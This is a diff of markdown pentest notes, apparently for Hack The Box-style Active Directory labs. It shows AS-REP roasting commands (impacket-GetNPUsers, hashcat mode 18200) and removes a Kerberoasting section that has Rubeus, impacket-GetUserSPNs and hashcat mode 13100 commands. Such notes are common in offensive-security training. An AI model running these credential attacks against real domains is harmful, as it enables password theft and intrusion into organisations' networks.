@@ -1,9 +1,9 @@
-# We got Users but no Pass?
+## We got Users but no Pass?
 
 ### Links
 
 - [GitHub Rubeus](https://github.com/GhostPack/Rubeus)
-#### ASREP Roasting Attack
+### ASREP Roasting Attack
 
 ```
 impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
@@ -24,23 +24,6 @@ cd C:\Tools
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-## Kerberoasting
 
-```
-
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-cat hashes.kerberoast
-hashcat --help | grep -i "Kerberos"
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
-
-```
 
 
